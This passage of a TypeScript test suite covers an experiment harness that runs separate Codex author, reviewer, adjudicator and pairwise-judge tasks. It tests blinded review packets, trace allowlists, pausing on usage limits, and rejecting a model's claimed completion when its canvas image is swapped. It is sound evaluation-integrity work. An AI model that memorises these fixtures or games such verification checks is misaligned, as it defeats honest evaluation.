    expect(pairwise.sides.map((side) => side.finalImage.final)).toEqual([true, true]);
  });

  it("creates a fresh blinded unavailable pairwise task without fabricated pixels when either author failed", async () => {
    const first = await reviewInput(await availableOrigin(), "unavailable-pair-success");
    const second = await failedAuthorReviewInput(await availableOrigin(), "unavailable-pair-failure");
    const subject = createExp0001aPairwiseReviewSubject({
      publicRequirement: first.publicRequirement,
      rubric: first.rubric,
      sides: [
        { authorPlan: first.authorPlan, authorLifecycle: first.authorLifecycle },
        { authorPlan: second.authorPlan, authorLifecycle: second.authorLifecycle },
      ],
    });
    expect(subject).toMatchObject({
      kind: "pairwise-review-unavailable-subject",
      unavailablePacket: {
        sides: [
          { slot: "canvas-1", availability: "available" },
          { slot: "canvas-2", availability: "unavailable" },
        ],
      },
    });
    const firstEnvelope = createExp0001aPairwiseVisualJudgeTaskEnvelopeFromSubject({
      subject,
      artifactPacketOrigin: await availableOrigin(),
    });
    const secondEnvelope = createExp0001aPairwiseVisualJudgeTaskEnvelopeFromSubject({
      subject,
      artifactPacketOrigin: await availableOrigin(),
    });
    expect(firstEnvelope.kind).toBe("pairwise-visual-unavailable-task-envelope");
    expect(firstEnvelope.pairRoot).toBe(secondEnvelope.pairRoot);
    expect(firstEnvelope.artifactPacket.origin).not.toBe(secondEnvelope.artifactPacket.origin);
    expect(firstEnvelope.artifactPacket.files).toEqual([
      expect.objectContaining({ mimeType: "application/json" }),
    ]);
    expect(firstEnvelope.artifactPacket.files.some((file) => file.mimeType === "image/png")).toBe(false);
    const packet = materializeExp0001aPairwiseReviewSubjectArtifactPacket({ subject, envelope: firstEnvelope });
    expect(packet.files).toHaveLength(1);
    expect(sha256Digest(Buffer.from(packet.files[0]!.contentBase64, "base64"))).toBe(packet.files[0]!.sha256);

    const plan = prepare(firstEnvelope, await packetReceipt(firstEnvelope), {
      transportId: "transport-pairwise-unavailable-unique",
    });
    const terminalResult = {
      schemaVersion: "blinded-canvas-pairwise-unavailable-result/v1" as const,
      role: "pairwise_visual_judge" as const,
      status: "non_evaluable" as const,
      preference: "unavailable" as const,
      pairRoot: firstEnvelope.pairRoot,
      primaryFailureClass: "FAIL_AUTHOR_NONCOMPLETION" as const,
      rationale: "One retained author artifact has no authoritative final pixels.",
    };
    expect(validateExp0001aCodexTerminalJson(plan, terminalResult)).toMatchObject({ preference: "unavailable" });
    expect(() => validateExp0001aCodexTerminalJson(plan, { ...terminalResult, pairRoot: digest("wrong-pair") }))
      .toThrow(/SUBJECT_ROOT/);
    const { lifecycle: running } = await begin(plan, "fresh-pairwise-unavailable-task");
    const awaitingRead = completeWait(running, terminalResult);
    const command = issueExp0001aReadThreadCommand({ lifecycle: awaitingRead, issuedAt: "2026-08-30T20:02:06.000Z" });
    const terminal = recordExp0001aReadThreadResult({
      plan,
      lifecycle: awaitingRead,
      command,
      observedAt: "2026-08-30T20:02:07.000Z",
      rawResult: rawReadThreadPage(plan, awaitingRead, terminalResult),
      finalAuthoritativeEvidenceReceipt: null,
    });
    expect(terminal).toMatchObject({
      state: "terminal",
      terminalOutcome: "succeeded",
      readReceipt: {
        terminalJson: { preference: "unavailable", status: "non_evaluable" },
        terminalArtifact: { kind: "pairwise-visual-result", subjectEvidenceRoot: firstEnvelope.pairRoot },
      },
    });
  });

  it("adjudicates one retained scored true and one canonical failed false using a fresh packet origin", async () => {
    const input = await reviewInput(await availableOrigin(), "adjudicator-failed-primary-subject");
    const { artifactPacketOrigin: _artifactPacketOrigin, ...subjectInput } = input;
    void _artifactPacketOrigin;
    const primarySubject = createExp0001aPrimaryReviewSubject(subjectInput);
    const primaryReviews = await retainedScoredAndFailedPrimaryPair(input);
    const subject = createExp0001aAdjudicationReviewSubject({
      primarySubject,
      primaryReviews,
    });
    const adjudicator = createExp0001aAdjudicatorTaskEnvelopeFromSubject({
      subject,
      artifactPacketOrigin: await availableOrigin(),
    });
    const secondAdjudicator = createExp0001aAdjudicatorTaskEnvelopeFromSubject({
      subject,
      artifactPacketOrigin: await availableOrigin(),
    });
    expect(secondAdjudicator.adjudicationSubjectRoot).toBe(adjudicator.adjudicationSubjectRoot);
    expect(secondAdjudicator.artifactPacket.origin).not.toBe(adjudicator.artifactPacket.origin);
    expect(materializeExp0001aAdjudicationReviewSubjectArtifactPacket({ subject, envelope: adjudicator }))
      .toMatchObject({ subjectDigest: subject.subjectDigest, files: [{ mimeType: "image/png" }] });
    expect(adjudicator.primaryReviews.map((review) => review.projectionKind)).toEqual([
      "scored-primary-review",
      "canonical-failed-primary-review",
    ]);
    expect(adjudicator.primaryReviews[1]).toMatchObject({
      result: {
        accepted: false,
        primaryFailureClass: "FAIL_EVALUATOR_SCORER",
        failureDisposition: "canonical_failed_false",
      },
      terminalArtifactRoot: null,
    });
    const prompt = renderExp0001aCodexTaskPrompt(adjudicator);
    expect(prompt).not.toMatch(/thread-primary|assignment-primary|attempt-primary|primary-review-[12]|primary decision/i);
    expect(prompt).not.toContain(adjudicator.primaryReviewRoot);
    expect(prompt).not.toContain(adjudicator.adjudicationSubjectRoot);
    for (const review of adjudicator.primaryReviews) {
      expect(prompt).not.toContain(review.resultDigest);
      expect(prompt).not.toContain(review.retainedTaskBindingDigest);
      expect(prompt).not.toContain(canonicalJson(review.result));
    }
  });

  it("keeps every author and reviewer role in a fresh separated task with its exact trace allowlist", async () => {
    const primary = createExp0001aPrimaryReviewerTaskEnvelope(await reviewInput(await availableOrigin()));
    const adjudicatorInput = await reviewInput(await availableOrigin());
    const adjudicator = createExp0001aAdjudicatorTaskEnvelope({
      primaryEvidenceEnvelope: createExp0001aPrimaryReviewerTaskEnvelope(adjudicatorInput),
      primaryReviews: await retainedDisagreeingPrimaryPair(adjudicatorInput),
    });
    const pairBase = await reviewInput(await availableOrigin(), "fresh-pair-left");
    const pairOther = await reviewInput(pairBase.artifactPacketOrigin, "fresh-pair-right");
    const pairwise = createExp0001aPairwiseVisualJudgeTaskEnvelope({
      publicRequirement: pairBase.publicRequirement,
      rubric: pairBase.rubric,
      artifactPacketOrigin: pairBase.artifactPacketOrigin,
      sides: [
        { authorPlan: pairBase.authorPlan, authorLifecycle: pairBase.authorLifecycle },
        { authorPlan: pairOther.authorPlan, authorLifecycle: pairOther.authorLifecycle },
      ],
    });
    const authorPlan = prepare(authorEnvelope());
    const primaryPlan = prepare(primary, await packetReceipt(primary));
    const adjudicatorPlan = prepare(adjudicator, await packetReceipt(adjudicator));
    const pairwisePlan = prepare(pairwise, await packetReceipt(pairwise));
    const entries = await Promise.all([
      begin(authorPlan, "fresh-author-task"),
      begin(primaryPlan, "fresh-primary-task"),
      begin(adjudicatorPlan, "fresh-adjudicator-task"),
      begin(pairwisePlan, "fresh-pairwise-task"),
    ]);
    const contexts = [authorPlan, primaryPlan, adjudicatorPlan, pairwisePlan].map((plan, index) => ({
      plan,
      lifecycle: entries[index]!.lifecycle,
    }));
    expect(() => assertExp0001aCodexTaskContextsSeparated(contexts)).not.toThrow();
    for (const { plan, lifecycle } of contexts) {
      const policy = evaluateExp0001aCodexTaskTracePolicy({
        plan,
        lifecycle,
        evaluatedAt: "2026-08-30T20:02:05.000Z",
        observation: traceObservation(plan, lifecycle),
      });
      expect(policy.decision, plan.role).toBe("pass");
    }
  });

  it("retains an uncertain create as begun and reconciles by its unique opaque title without retry", async () => {
    const plan = prepare(authorEnvelope());
    const release = await recordExp0001aCreateThreadReleaseInvoked({
      plan,
      journalEvidenceDigest: digest("journal-uncertain"),
    });
    let lifecycle = recordExp0001aCreateThreadResult({
      plan,
      releaseInvocationReceipt: release,
      observedAt: "2026-08-30T20:02:02.000Z",
      rawResult: codexAppResult({ clientThreadId: "pending-client-thread-id" }),
    });
    expect(lifecycle).toMatchObject({ state: "creation_uncertain", taskBegun: true, codexTaskId: null });
    expect(() => issueExp0001aWaitThreadsCommand({ lifecycle, issuedAt: "2026-08-30T20:02:03.000Z" })).toThrow(/NOT_WAITABLE/);

    let command = issueExp0001aCreateReconciliationCommand({ plan, lifecycle, issuedAt: "2026-08-30T20:02:03.000Z" });
    lifecycle = recordExp0001aCreateReconciliationResult({
      plan,
      lifecycle,
      command,
      observedAt: "2026-08-30T20:02:04.000Z",
      rawResult: codexAppResult({ schemaVersion: 4, pinnedThreads: [], threads: [] }),
    });
    expect(lifecycle.state).toBe("creation_uncertain");
    command = issueExp0001aCreateReconciliationCommand({ plan, lifecycle, issuedAt: "2026-08-30T20:02:05.000Z" });
    lifecycle = recordExp0001aCreateReconciliationResult({
      plan,
      lifecycle,
      command,
      observedAt: "2026-08-30T20:02:06.000Z",
      rawResult: codexAppResult({
        schemaVersion: 4,
        pinnedThreads: [{
          id: "reconciled-task-id",
          kind: "codex",
          hostId: "local",
          title: plan.createThreadCommand.arguments.title,
          status: "idle",
        }],
        threads: [],
      }),
    });
    expect(lifecycle).toMatchObject({ state: "running", codexTaskId: "reconciled-task-id" });
  });

  it("finalizes a reconciled ambiguous create from its unique retained identity and conservative release time", async () => {
    const plan = prepare(authorEnvelope(), null, { transportId: "transport-reconciled-accounting" });
    const release = await recordExp0001aCreateThreadReleaseInvoked({
      plan,
      journalEvidenceDigest: digest("journal-reconciled-accounting"),
    });
    let lifecycle = recordExp0001aCreateThreadResult({
      plan,
      releaseInvocationReceipt: release,
      observedAt: "2026-08-30T20:02:02.000Z",
      rawResult: codexAppResult({ clientThreadId: "pending-reconciled-accounting" }),
    });
    const reconcileCommand = issueExp0001aCreateReconciliationCommand({
      plan,
      lifecycle,
      issuedAt: "2026-08-30T20:02:02.250Z",
    });
    lifecycle = recordExp0001aCreateReconciliationResult({
      plan,
      lifecycle,
      command: reconcileCommand,
      observedAt: "2026-08-30T20:02:02.500Z",
      rawResult: codexAppResult({
        schemaVersion: 4,
        pinnedThreads: [],
        threads: [{
          id: "reconciled-accounting-task",
          kind: "codex",
          hostId: "local",
          title: plan.createThreadCommand.arguments.title,
          status: "idle",
        }],
      }),
    });
    const terminalJson = {
      schemaVersion: "jazzboard-canvas-terminal-result/v1" as const,
      actor: "canvas_worker" as const,
      status: "completed" as const,
      artifactSummary: "Created and inspected the requested diagram.",
      finalAuthoritativeRead: { roomRevision: 4, objectCount: 5 },
      webMcpToolsUsed: [
        "get_canvas_capabilities",
        "read_room_state",
        "apply_canvas_transaction",
        "inspect_canvas_scope",
        "export_canvas_png",
      ],
    };
    const awaitingRead = completeWait(lifecycle, terminalJson);
    const readCommand = issueExp0001aReadThreadCommand({
      lifecycle: awaitingRead,
      issuedAt: "2026-08-30T20:02:06.000Z",
    });
    const terminal = recordExp0001aReadThreadResult({
      plan,
      lifecycle: awaitingRead,
      command: readCommand,
      observedAt: "2026-08-30T20:02:07.000Z",
      rawResult: rawReadThreadPage(plan, awaitingRead, terminalJson),
      finalAuthoritativeEvidenceReceipt: finalRoomReadReceipt(plan, awaitingRead),
    });
    const finalization = finalizeExp0001aCodexTaskAccounting({
      accountingId: "accounting-reconciled-create",
      plan,
      lifecycle: terminal,
    });

    expect(finalization).toMatchObject({
      codexTaskId: "reconciled-accounting-task",
      threadId: "reconciled-accounting-task",
      hostId: "local",
      begunAt: release.invokedAt,
      terminalOutcome: "succeeded",
    });
    expect(terminal.createReceipt).toMatchObject({
      outcome: "uncertain_after_release",
      codexTaskId: null,
      rawResult: expect.any(Object),
    });
    expect(terminal.reconciliationReceipts).toHaveLength(1);
    expect(() => assertExp0001aCodexTaskContextsSeparated([{ plan, lifecycle: terminal }])).not.toThrow();
  });

  it("retains an authoritative create-time usage refusal as genuinely unstarted", async () => {
    const plan = prepare(authorEnvelope());
    const release = await recordExp0001aCreateThreadReleaseInvoked({
      plan, journalEvidenceDigest: digest("journal-limit"),
    });
    const lifecycle = recordExp0001aCreateThreadResult({
      plan,
      releaseInvocationReceipt: release,
      observedAt: "2026-08-30T20:02:02.000Z",
      rawResult: codexAppResult({ error: { code: "usage_limit" }, taskCreated: false }, true),
    });
    expect(lifecycle).toMatchObject({
      state: "not_started_usage_limited",
      taskBegun: false,
      codexTaskId: null,
      terminalOutcome: null,
      createReceipt: { outcome: "usage_limit", failureCode: "codex_usage_limit" },
    });
    expect(() => issueExp0001aCreateReconciliationCommand({
      plan,
      lifecycle,
      issuedAt: "2026-08-30T20:02:03.000Z",
    })).toThrow(/NOT_UNCERTAIN/);
  });

  it("keeps an ambiguous create-time usage error begun and reconcilable without blind re-release", async () => {
    const plan = prepare(authorEnvelope(), null, { transportId: "transport-create-limit-ambiguous" });
    const release = await recordExp0001aCreateThreadReleaseInvoked({
      plan, journalEvidenceDigest: digest("journal-limit-ambiguous"),
    });
    const lifecycle = recordExp0001aCreateThreadResult({
      plan,
      releaseInvocationReceipt: release,
      observedAt: "2026-08-30T20:02:02.000Z",
      rawResult: codexAppResult({ error: { code: "usage_limit" } }, true),
    });
    expect(lifecycle).toMatchObject({
      state: "creation_uncertain",
      taskBegun: true,
      codexTaskId: null,
      createReceipt: {
        outcome: "uncertain_after_release",
        failureCode: "codex_usage_limit_creation_ambiguous",
      },
    });
    expect(issueExp0001aCreateReconciliationCommand({
      plan,
      lifecycle,
      issuedAt: "2026-08-30T20:02:03.000Z",
    })).toMatchObject({ toolName: "mcp__codex_app__list_threads" });
  });

  it("globally pauses an authoritative author create refusal and resumes the same balanced unstarted assignment", async () => {
    const root = await mkdtemp(path.join(tmpdir(), "exp0001a-author-create-limit-"));
    temporaryRoots.push(root);
    const provisioningCoordinator = createExp0001aProvisioningCoordinator({
      filePath: path.join(root, "provisioning.json"),
      now: () => "2026-08-30T20:02:02.000Z",
      createRoomNonce: () => "rn_0123456789abcdef0123456789abcdef",
    });
    const provisioningState = await provisioningCoordinator.initialize();
    const plan = prepare(authorEnvelope(), null, { transportId: "transport-author-create-limit-global" });
    const release = await recordExp0001aCreateThreadReleaseInvoked({
      plan, journalEvidenceDigest: digest("journal-author-create-limit-global"),
    });
    const journal = createExp0001aCodexCoordinatorJournal({
      provisioningState,
      plans: [plan],
      releaseInvocations: [release],
    });
    const action = planNextExp0001aCodexCoordinatorAction({
      issuedAt: "2026-08-30T20:02:02.000Z",
      provisioningState,
      journal,
    });
    expect(action.kind).toBe("create_codex_task");
    if (action.kind !== "create_codex_task") throw new Error("expected create action");
    const retained = await ingestExp0001aCoordinatorActionResult({
      action,
      rawResult: codexAppResult({ error: { code: "subscription_usage_limit" }, taskCreated: false }, true),
      observedAt: "2026-08-30T20:02:02.500Z",
      provisioningState,
      coordinatorJournal: journal,
      provisioningCoordinator,
    });
    expect(retained.coordinatorJournal.lifecycles[0]).toMatchObject({
      state: "not_started_usage_limited",
      taskBegun: false,
      createReceipt: { outcome: "usage_limit" },
    });
    expect(retained.coordinatorJournal.accountingFinalizationReceipts).toHaveLength(0);
    expect(retained.provisioningState.scheduler.pause).toMatchObject({
      affectedAssignmentId: plan.privateBinding.assignmentId,
      affectedTask: { taskBegun: false, role: "author" },
    });
    expect(retained.provisioningState.scheduler.assignments.every((assignment) => assignment.state === "unstarted")).toBe(true);
    expect(exp0001aCodexBalanceReport(retained.provisioningState.scheduler)).toMatchObject({
      begunA0: 0,
      begunA1: 0,
      cumulativeImbalance: 0,
    });
    expect(planNextExp0001aCodexCoordinatorAction({
      issuedAt: "2026-08-30T20:02:03.000Z",
      provisioningState: retained.provisioningState,
      journal: retained.coordinatorJournal,
    })).toMatchObject({ kind: "run_subscription_availability_probe", mayReleaseExperimentBrief: false });
    const resumed = resumeAfterNeutralProbe(retained.provisioningState.scheduler, "author-create-limit");
    expect(nextExp0001aCodexAssignment(resumed)).toMatchObject({
      kind: "ready",
      assignment: { assignmentId: plan.privateBinding.assignmentId },
    });
    expect(resumed.assignments.every((assignment) => assignment.state === "unstarted")).toBe(true);
  });

  it("globally pauses an authoritative reviewer create refusal without counting or replacing a task", async () => {
    const root = await mkdtemp(path.join(tmpdir(), "exp0001a-reviewer-create-limit-"));
    temporaryRoots.push(root);
    const provisioningCoordinator = createExp0001aProvisioningCoordinator({
      filePath: path.join(root, "provisioning.json"),
      now: () => "2026-08-30T20:02:02.000Z",
      createRoomNonce: () => "rn_0123456789abcdef0123456789abcdef",
    });
    const provisioningState = await provisioningCoordinator.initialize();
    const envelope = createExp0001aPrimaryReviewerTaskEnvelope(await reviewInput(availableOrigin(), "create-limit-reviewer"));
    const plan = prepare(envelope, await packetReceipt(envelope), {
      transportId: "transport-reviewer-create-limit-global",
    });
    const release = await recordExp0001aCreateThreadReleaseInvoked({
      plan, journalEvidenceDigest: digest("journal-reviewer-create-limit-global"),
    });
    const journal = createExp0001aCodexCoordinatorJournal({
      provisioningState,
      plans: [plan],
      releaseInvocations: [release],
    });
    const action = planNextExp0001aCodexCoordinatorAction({
      issuedAt: "2026-08-30T20:02:02.000Z",
      provisioningState,
      journal,
    });
    expect(action.kind).toBe("create_codex_task");
    if (action.kind !== "create_codex_task") throw new Error("expected create action");
    const retained = await ingestExp0001aCoordinatorActionResult({
      action,
      rawResult: codexAppResult({ error: { code: "usage_limit" }, taskCreated: false }, true),
      observedAt: "2026-08-30T20:02:02.500Z",
      provisioningState,
      coordinatorJournal: journal,
      provisioningCoordinator,
    });
    expect(retained.coordinatorJournal.lifecycles[0]).toMatchObject({
      role: "primary_reviewer",
      state: "not_started_usage_limited",
      taskBegun: false,
    });
    expect(retained.coordinatorJournal.accountingFinalizationReceipts).toHaveLength(0);
    expect(retained.provisioningState.scheduler.pause).toMatchObject({
      affectedAssignmentId: null,
      affectedTask: { role: "primary_reviewer", taskBegun: false },
    });
    expect(planNextExp0001aCodexCoordinatorAction({
      issuedAt: "2026-08-30T20:02:03.000Z",
      provisioningState: retained.provisioningState,
      journal: retained.coordinatorJournal,
    })).toMatchObject({ kind: "run_subscription_availability_probe", mayReleaseExperimentBrief: false });
    const resumed = resumeAfterNeutralProbe(retained.provisioningState.scheduler, "reviewer-create-limit");
    expect(nextExp0001aCodexAssignment(resumed)).toMatchObject({ kind: "ready" });
    expect(retained.coordinatorJournal.plans.filter((candidate) => candidate.role === "primary_reviewer")).toHaveLength(1);
    expect(retained.coordinatorJournal.lifecycles.filter((candidate) => candidate.taskBegun)).toHaveLength(0);
  });

  it("retains an ambiguous create in its release window across reset and begins only after unique reconciliation", async () => {
    const root = await mkdtemp(path.join(tmpdir(), "exp0001a-ambiguous-create-window-"));
    temporaryRoots.push(root);
    const provisioningCoordinator = createExp0001aProvisioningCoordinator({
      filePath: path.join(root, "provisioning.json"),
      now: () => "2026-08-30T20:02:07.000Z",
      createRoomNonce: () => "rn_0123456789abcdef0123456789abcdef",
    });
    let provisioningState = await provisioningCoordinator.initialize();
    const plan = prepare(authorEnvelope(), null, { transportId: "transport-ambiguous-create-window" });
    const release = await recordExp0001aCreateThreadReleaseInvoked({
      plan,
      journalEvidenceDigest: digest("journal-ambiguous-create-window"),
    });
    let journal = createExp0001aCodexCoordinatorJournal({
      provisioningState,
      plans: [plan],
      releaseInvocations: [release],
    });
    let action = planNextExp0001aCodexCoordinatorAction({
      issuedAt: "2026-08-30T20:02:02.000Z", provisioningState, journal,
    });
    if (action.kind !== "create_codex_task") throw new Error("expected create action");
    let mutation = await ingestExp0001aCoordinatorActionResult({
      action,
      rawResult: codexAppResult({ error: { code: "usage_limit" } }, true),
      observedAt: "2026-08-30T20:02:02.500Z",
      provisioningState,
      coordinatorJournal: journal,
      provisioningCoordinator,
    });
    expect(mutation.coordinatorJournal.lifecycles[0]).toMatchObject({
      state: "creation_uncertain",
      taskBegun: true,
      createReceipt: { failureCode: "codex_usage_limit_creation_ambiguous" },
    });
    expect(mutation.provisioningState.scheduler.pause).not.toBeNull();

    const resumedScheduler = resumeAfterNeutralProbe(
      mutation.provisioningState.scheduler,
      "ambiguous-create-window",
    );
    provisioningState = await provisioningCoordinator.synchronizeScheduler(resumedScheduler);
    journal = createExp0001aCodexCoordinatorJournal({
      provisioningState,
      plans: mutation.coordinatorJournal.plans,
      releaseInvocations: mutation.coordinatorJournal.releaseInvocations,
      lifecycles: mutation.coordinatorJournal.lifecycles,
      priorJournalDigest: mutation.coordinatorJournal.journalDigest,
    });
    action = planNextExp0001aCodexCoordinatorAction({
      issuedAt: "2026-08-30T20:02:08.000Z", provisioningState, journal,
    });
    if (action.kind !== "reconcile_uncertain_create") throw new Error("expected reconciliation action");
    mutation = await ingestExp0001aCoordinatorActionResult({
      action,
      rawResult: codexAppResult({
        schemaVersion: 4,
        pinnedThreads: [],
        threads: [{
          id: "reconciled-window-zero-task",
          kind: "codex",
          hostId: "local",
          title: plan.createThreadCommand.arguments.title,
          status: "idle",
        }],
      }),
      observedAt: "2026-08-30T20:02:08.500Z",
      provisioningState,
      coordinatorJournal: journal,
      provisioningCoordinator,
    });
    expect(mutation.provisioningState.scheduler).toMatchObject({ currentUsageWindow: 1, pause: null });
    expect(mutation.provisioningState.scheduler.assignments[0]).toMatchObject({
      assignmentId: plan.privateBinding.assignmentId,
      state: "begun",
      usageWindow: 0,
      begunAt: release.invokedAt,
      codexTaskId: "reconciled-window-zero-task",
    });
    expect(mutation.coordinatorJournal.lifecycles[0]).toMatchObject({
      state: "running",
      codexTaskId: "reconciled-window-zero-task",
    });
  });

  it("atomically advances a successful author from scheduler assignment zero to the next frozen assignment", async () => {
    const root = await mkdtemp(path.join(tmpdir(), "exp0001a-author-scheduler-progress-"));
    temporaryRoots.push(root);
    const provisioningCoordinator = createExp0001aProvisioningCoordinator({
      filePath: path.join(root, "provisioning.json"),
      now: () => "2026-08-30T20:02:07.000Z",
      createRoomNonce: () => "rn_0123456789abcdef0123456789abcdef",
    });
    let provisioningState = await provisioningCoordinator.initialize();
    const plan = prepare(authorEnvelope(), null, { transportId: "transport-author-scheduler-progress" });
    const release = await recordExp0001aCreateThreadReleaseInvoked({
      plan, journalEvidenceDigest: digest("journal-author-scheduler-progress"),
    });
    let journal = createExp0001aCodexCoordinatorJournal({
      provisioningState,
      plans: [plan],
      releaseInvocations: [release],
    });
    let action = planNextExp0001aCodexCoordinatorAction({
      issuedAt: "2026-08-30T20:02:02.000Z", provisioningState, journal,
    });
    if (action.kind !== "create_codex_task") throw new Error("expected author create");
    let mutation = await ingestExp0001aCoordinatorActionResult({
      action,
      rawResult: codexAppResult({ threadId: "thread-author-scheduler-progress", hostId: "local" }),
      observedAt: "2026-08-30T20:02:02.000Z",
      provisioningState,
      coordinatorJournal: journal,
      provisioningCoordinator,
    });
    ({ provisioningState, coordinatorJournal: journal } = mutation);
    expect(provisioningState.scheduler.assignments[0]).toMatchObject({
      state: "begun", codexTaskId: "thread-author-scheduler-progress",
    });

    action = planNextExp0001aCodexCoordinatorAction({
      issuedAt: "2026-08-30T20:02:03.000Z", provisioningState, journal,
    });
    if (action.kind !== "wait_for_active_task") throw new Error("expected author wait");
    const terminalJson = {
      schemaVersion: "jazzboard-canvas-terminal-result/v1" as const,
      actor: "canvas_worker" as const,
      status: "completed" as const,
      artifactSummary: "Completed the frozen author artifact.",
      finalAuthoritativeRead: { roomRevision: 4, objectCount: 5 },
      webMcpToolsUsed: ["get_canvas_capabilities", "read_room_state", "apply_canvas_transaction", "inspect_canvas_scope", "export_canvas_png"],
    };
    mutation = await ingestExp0001aCoordinatorActionResult({
      action,
      rawResult: codexAppResult({
        timedOut: false,
        wake: { reason: "turnCompleted", turnId: "turn-terminal", threadId: "thread-author-scheduler-progress", hostId: "local" },
        polls: [{
          schemaVersion: 1,
          cursor: "cursor-author-scheduler-progress",
          revision: 1,
          changed: true,
          thread: { id: "thread-author-scheduler-progress", hostId: "local", status: { type: "idle" } },
          latestTurn: {
            id: "turn-terminal", status: "completed", error: null,
            startedAt: Date.parse("2026-08-30T20:02:03.000Z") / 1_000,
            completedAt: Date.parse("2026-08-30T20:02:03.500Z") / 1_000,
            durationMs: 500,
          },
          latestAssistantMessageId: "message-terminal",
          latestAssistantMessage: {
            id: "message-terminal", turnId: "turn-terminal", phase: "final_answer",
            text: canonicalJson(terminalJson),
          },
          latestToolMarkerId: null,
          latestToolMarker: null,
        }],
      }),
      observedAt: "2026-08-30T20:02:04.000Z",
      provisioningState,
      coordinatorJournal: journal,
      provisioningCoordinator,
    });
    ({ provisioningState, coordinatorJournal: journal } = mutation);

    action = planNextExp0001aCodexCoordinatorAction({
      issuedAt: "2026-08-30T20:02:04.250Z", provisioningState, journal,
    });
    if (action.kind !== "collect_author_final_evidence") throw new Error("expected final evidence");
    mutation = await ingestExp0001aCoordinatorActionResult({
      action,
      rawResult: finalAuthorEvidence(plan),
      observedAt: "2026-08-30T20:02:04.750Z",
      provisioningState,
      coordinatorJournal: journal,
      provisioningCoordinator,
    });
    ({ provisioningState, coordinatorJournal: journal } = mutation);

    action = planNextExp0001aCodexCoordinatorAction({
      issuedAt: "2026-08-30T20:02:06.000Z", provisioningState, journal,
    });
    if (action.kind !== "read_terminal_task") throw new Error("expected terminal read");
    const awaitingRead = journal.lifecycles[0]!;
    mutation = await ingestExp0001aCoordinatorActionResult({
      action,
      rawResult: rawReadThreadPage(plan, awaitingRead, terminalJson),
      observedAt: "2026-08-30T20:02:07.000Z",
      provisioningState,
      coordinatorJournal: journal,
      provisioningCoordinator,
    });
    ({ provisioningState, coordinatorJournal: journal } = mutation);
    expect(provisioningState.scheduler.assignments[0]).toMatchObject({
      state: "terminal", terminalOutcome: "succeeded",
    });
    expect(nextExp0001aCodexAssignment(provisioningState.scheduler)).toMatchObject({
      kind: "ready", assignment: { assignmentId: provisioningState.scheduler.assignments[1]!.assignmentId },
    });
    expect(planNextExp0001aCodexCoordinatorAction({
      issuedAt: "2026-08-30T20:02:08.000Z", provisioningState, journal,
    })).toMatchObject({
      kind: "perform_provisioning_local_transition",
      transition: "reserve_next_attempt",
      assignmentId: provisioningState.scheduler.assignments[1]!.assignmentId,
    });
  });

  it("reads and retains a usage-limited author before pausing instead of requesting final canvas evidence", async () => {
    const plan = prepare(authorEnvelope(), null, { transportId: "transport-author-usage-limit-routing" });
    const { release, lifecycle: running } = await begin(plan, "thread-author-usage-limit-routing");
    const waitCommand = issueExp0001aWaitThreadsCommand({
      lifecycle: running,
      issuedAt: "2026-08-30T20:02:03.000Z",
    });
    const awaitingRead = recordExp0001aWaitThreadsResult({
      lifecycle: running,
      command: waitCommand,
      observedAt: "2026-08-30T20:02:04.000Z",
      rawResult: codexAppResult({
        timedOut: false,
        wake: {
          reason: "turnFailed",
          turnId: "turn-usage-limit",
          threadId: running.threadId!,
          hostId: running.hostId!,
        },
        polls: [{
          schemaVersion: 1,
          cursor: "cursor-usage-limit",
          revision: 1,
          changed: true,
          thread: { id: running.threadId!, hostId: running.hostId!, status: { type: "idle" } },
          latestTurn: {
            id: "turn-usage-limit",
            status: "failed",
            error: { code: "subscription_usage_limit" },
            startedAt: Date.parse("2026-08-30T20:02:03.000Z") / 1_000,
            completedAt: Date.parse("2026-08-30T20:02:03.500Z") / 1_000,
            durationMs: 500,
          },
          latestAssistantMessageId: null,
          latestAssistantMessage: null,
          latestToolMarkerId: null,
          latestToolMarker: null,
        }],
      }),
    });
    expect(awaitingRead.waitReceipts.at(-1)?.outcome).toBe("usage_limit");
    const root = await mkdtemp(path.join(tmpdir(), "exp0001a-usage-routing-"));
    temporaryRoots.push(root);
    const provisioning = createExp0001aProvisioningCoordinator({
      filePath: path.join(root, "provisioning.json"),
      now: () => "2026-08-30T20:02:04.000Z",
      createRoomNonce: () => "rn_0123456789abcdef0123456789abcdef",
    });
    const provisioningState = await provisioning.initialize();
    const journal = createExp0001aCodexCoordinatorJournal({
      provisioningState,
      plans: [plan],
      releaseInvocations: [release],
      lifecycles: [awaitingRead],
    });
    const action = planNextExp0001aCodexCoordinatorAction({
      issuedAt: "2026-08-30T20:02:05.000Z",
      provisioningState,
      journal,
    });
    expect(action).toMatchObject({ kind: "read_terminal_task",
      expectedIngest: { operation: "recordReadThreadResult", planDigest: plan.planDigest } });
  });

  it("never accepts model completion without a complete author trace and independently reconciled canvas evidence", async () => {
    const plan = prepare(authorEnvelope());
    const { lifecycle: running } = await begin(plan);
    const terminalJson = {
      schemaVersion: "jazzboard-canvas-terminal-result/v1" as const,
      actor: "canvas_worker" as const,
      status: "completed" as const,
      artifactSummary: "Created and inspected a three-service flow.",
      finalAuthoritativeRead: { roomRevision: 4, objectCount: 5 },
      webMcpToolsUsed: [
        "get_canvas_capabilities",
        "read_room_state",
        "apply_canvas_transaction",
        "inspect_canvas_scope",
        "export_canvas_png",
      ],
    };
    const terminalResultDigest = terminalTextDigest(terminalJson);
    const awaitingRead = completeWait(running, terminalJson);
    const tracePolicy = evaluateExp0001aCodexTaskTracePolicy({
      plan,
      lifecycle: awaitingRead,
      evaluatedAt: "2026-08-30T20:02:05.000Z",
      observation: traceObservation(plan, awaitingRead),
    });
    const trace = traceObservation(plan, awaitingRead);
    const authoritativeReceipt = finalRoomReadReceipt(plan, awaitingRead, trace);
    const artifact = createExp0001aIndependentAuthorArtifact({
      plan,
      lifecycle: awaitingRead,
      modelTerminalResultDigest: terminalResultDigest,
      modelTerminalJson: terminalJson,
      finalAuthoritativeRoomReadReceipt: authoritativeReceipt,
      taskTraceObservation: trace,
    });
    expect(artifact.canvasImageDigest).toBe(authoritativeReceipt.canvasImageDigest);
    expect(Buffer.from(DIFFERENT_ONE_PIXEL_PNG_BASE64, "base64")).toHaveLength(authoritativeReceipt.canvasImageBytes);
    const { receiptDigest: _originalReceiptDigest, ...receiptContent } = authoritativeReceipt;
    void _originalReceiptDigest;
    const substitutedImageDigest = sha256Digest(Buffer.from(DIFFERENT_ONE_PIXEL_PNG_BASE64, "base64"));
    const substitutedContent = {
      ...receiptContent,
      canvasImageDigest: substitutedImageDigest,
      canvasImagePngBase64: DIFFERENT_ONE_PIXEL_PNG_BASE64,
      retainedEvidenceDigest: hashCanonicalJson({
